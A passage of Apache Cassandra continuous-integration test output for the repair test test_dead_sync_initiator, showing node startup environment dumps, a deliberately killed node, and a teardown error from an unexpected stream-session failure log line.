'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/conf'}
01:33:20 23:33:15,475 ccm INFO node3: using Java 8 for the current invocation
01:33:20 23:33:15,475 ccm INFO node3: using Java 8 for the current invocation
01:33:20 23:33:15,951 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Dcassandra.migration_task_wait_in_seconds=6'}
01:33:20 23:33:15,951 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Dcassandra.migration_task_wait_in_seconds=6'}
01:33:20 23:33:15,951 ccm INFO node3: using Java 8 for the current invocation
01:33:20 23:33:15,951 ccm INFO node3: using Java 8 for the current invocation
01:33:20 23:33:16,148 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:33:20 23:33:16,148 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:33:20 23:33:16,423 cassandra.cluster WARNING Node 127.0.0.1:9042 is reporting a schema disagreement: {UUID('fec4b955-f2c7-388a-89de-0d3cfa279c9d'): [<DefaultEndPoint: 127.0.0.2:9042>, <DefaultEndPoint: 127.0.0.1:9042>], UUID('2207c2a9-f598-3971-986b-2926e09e239d'): [<DefaultEndPoint: 127.0.0.3:9042>]}
01:33:20 23:33:31,571 cassandra.cluster INFO Host 127.0.0.3:9042 may be up; will prepare queries and open connection pool
01:33:31 23:33:31,696 repair_tests.repair_test DEBUG Submitting byteman script to node2
01:33:31 install rule sleep 60s on stream session
01:33:31 
01:33:31 23:33:31,814 repair_tests.repair_test DEBUG repair node1
01:33:31 23:33:31,815 repair_tests.repair_test DEBUG Will kill node2 in middle of sync
01:33:31 23:33:31,910 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node1/conf'}
01:33:31 23:33:31,910 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node1/conf'}
01:33:31 23:33:31,910 ccm INFO node1: using Java 8 for the current invocation
01:33:31 23:33:31,910 ccm INFO node1: using Java 8 for the current invocation
01:33:31 23:33:35,626 dtest_setup DEBUG Errors were just seen in logs, ending test (if not ending already)!
01:33:35 Exception in thread Thread-18:
01:33:35 Traceback (most recent call last):
01:33:35   File ""/usr/lib/python3.8/threading.py"", line 932, in _bootstrap_inner
01:33:35     self.run()
01:33:35   File ""/home/cassandra/cassandra/venv/lib/python3.8/site-packages/ccmlib/cluster.py"", line 193, in run
01:33:35     self.scan_and_report()
01:33:35   File ""/home/cassandra/cassandra/venv/lib/python3.8/site-packages/ccmlib/cluster.py"", line 186, in scan_and_report
01:33:35     on_error_call(errordata)
01:33:35   File ""/home/cassandra/cassandra/cassandra-dtest/dtest_setup.py"", line 136, in _log_error_handler
01:33:35     pytest.fail(""Error details: \n{message}"".format(message=message))
01:33:35   File ""/home/cassandra/cassandra/venv/lib/python3.8/site-packages/_pytest/outcomes.py"", line 97, in fail
01:33:35     raise Failed(msg=msg, pytrace=pytrace)
01:33:35 Failed: Error details: 
01:33:35 Errors seen in logs for: node3
01:33:35 node3: ERROR [Stream-Deserializer-/127.0.0.1:7000-0248e07d] 2022-03-29 23:33:35,409 StreamSession.java:883 - [Stream #a619ba70-afb8-11ec-998e-9bfc7bd0a44f] Remote peer /127.0.0.1:7000 failed stream session.
01:33:35 23:33:48,854 repair_tests.repair_test DEBUG Killed node2, now waiting repair to finish
01:33:49 PASSED
01:33:49 ------------------------------ live log teardown -------------------------------
01:33:49 23:33:48,884 conftest ERROR Unexpected error in node3 log, error: 
01:33:49 ERROR [Stream-Deserializer-/127.0.0.1:7000-0248e07d] 2022-03-29 23:33:35,409 StreamSession.java:883 - [Stream #a619ba70-afb8-11ec-998e-9bfc7bd0a44f] Remote peer /127.0.0.1:7000 failed stream session.
01:33:49 23:33:49,389 dtest_setup DEBUG removing ccm cluster test at: /home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0
01:33:49 23:33:49,655 dtest_setup DEBUG clearing ssl stores from [/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0] directory
01:33:49 
01:33:49 repair_tests/repair_test.py::TestRepair::test_dead_sync_initiator ERROR
01:33:49 
01:33:49 ==================================== ERRORS ====================================
01:33:49 ___________ ERROR at teardown of TestRepair.test_dead_sync_initiator ___________
01:33:49 Unexpected error found in node logs (see stdout for full details). Errors: [ERROR [Stream-Deserializer-/127.0.0.1:7000-0248e07d] 2022-03-29 23:33:35,409 StreamSession.java:883 - [Stream #a619ba70-afb8-11ec-998e-9bfc7bd0a44f] Remote peer /127.0.0.1:7000 failed stream session., ERROR [Stream-Deserializer-/127.0.0.1:7000-0248e07d] 2022-03-29 23:33:35,409 StreamSession.java:883 - [Stream #a619ba70-afb8-11ec-998e-9bfc7bd0a44f] Remote peer /127.0.0.1:7000 failed stream session.]
{noformat}

h5. Cassandra-4.0/374 onheap

Cassandra-4.0/374/testReport/dtest.repair_tests.repair_test/TestRepair/test_dead_sync_initiator/
 --> Cassandra-4.0-dtest/324/label=cassandra-dtest,split=52/
 --> https://nightlies.apache.org/cassandra/cassandra-4.0/Cassandra-4.0-dtest/324/Cassandra-4.0-dtest/label=cassandra-dtest,split=52/


In the stage's console we see 
{noformat}
01:31:58 repair_tests/repair_test.py::TestRepair::test_dead_sync_initiator 
01:31:58 -------------------------------- live log setup --------------------------------
01:31:58 23:31:58,8 conftest INFO Starting execution of test_dead_sync_initiator at 2022-03-29 23:31:58.008208
01:31:58 swapoff: Not superuser.
01:31:58 23:31:58,68 dtest_setup INFO cluster ccm directory: /home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6
01:31:58 23:31:58,169 ccm DEBUG Log-watching thread starting.
01:31:58 -------------------------------- live log call ---------------------------------
01:31:58 23:31:58,169 ccm DEBUG Log-watching thread starting.
01:31:58 23:31:58,173 repair_tests.repair_test DEBUG Setting up cluster..
01:31:58 23:31:59,385 ccm DEBUG pregenerated tokens from cmd_list: ['/home/cassandra/cassandra/tools/bin/generatetokens', '-n', '3', '-t', '16', '--rf', '3', '-p', 'Murmur3Partitioner'] are ['-8651079411448588933,-7683715168370053434,-6093710615856154796,-4474687320159111498,-3496541867642997423,-1717907566819410294,-621865666584472005,469431444107740254,1313808091598902011,2754076321501485249,3825576937841518062,4843428342583945077,5661100275196295872,6736856156421875411,7472771849132769052,8552144656580370710', '-9144322176860856085,-8095198376531664996,-7159285203740149576,-6743647544168509696,-5531967197496528550,-5134644345147815759,-3876223629202372671,-2841922982526968305,-2415636481245838915,-1065434654671161031,-8058137742202814,2113636762260032293,3372057353403685326,4436398343176748723,6256402644156695122,8133466973669681151', '-6375304352541734378,-4742823388537470326,-4109839565064336202,-3131948708670847539,-1984625000315170831,-1317694251394229995,-260137566704181436,982300747975950714,1809147204714063984,2473655906891322058,3135787413193563294,4198139812863914834,5336266352253809826,7168182081208892509,7882477545606553502,8999715996478251096']
01:31:59 23:31:59,385 ccm DEBUG pregenerated tokens from cmd_list: ['/home/cassandra/cassandra/tools/bin/generatetokens', '-n', '3', '-t', '16', '--rf', '3', '-p', 'Murmur3Partitioner'] are ['-8651079411448588933,-7683715168370053434,-6093710615856154796,-4474687320159111498,-3496541867642997423,-1717907566819410294,-621865666584472005,469431444107740254,1313808091598902011,2754076321501485249,3825576937841518062,4843428342583945077,5661100275196295872,6736856156421875411,7472771849132769052,8552144656580370710', '-9144322176860856085,-8095198376531664996,-7159285203740149576,-6743647544168509696,-5531967197496528550,-5134644345147815759,-3876223629202372671,-2841922982526968305,-2415636481245838915,-1065434654671161031,-8058137742202814,2113636762260032293,3372057353403685326,4436398343176748723,6256402644156695122,8133466973669681151', '-6375304352541734378,-4742823388537470326,-4109839565064336202,-3131948708670847539,-1984625000315170831,-1317694251394229995,-260137566704181436,982300747975950714,1809147204714063984,2473655906891322058,3135787413193563294,4198139812863914834,5336266352253809826,7168182081208892509,7882477545606553502,8999715996478251096']
01:31:59 23:32:00,636 repair_tests.repair_test DEBUG Setting up byteman on node2
01:32:00 23:32:00,904 repair_tests.repair_test DEBUG Starting cluster..
01:32:00 23:32:01,12 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.as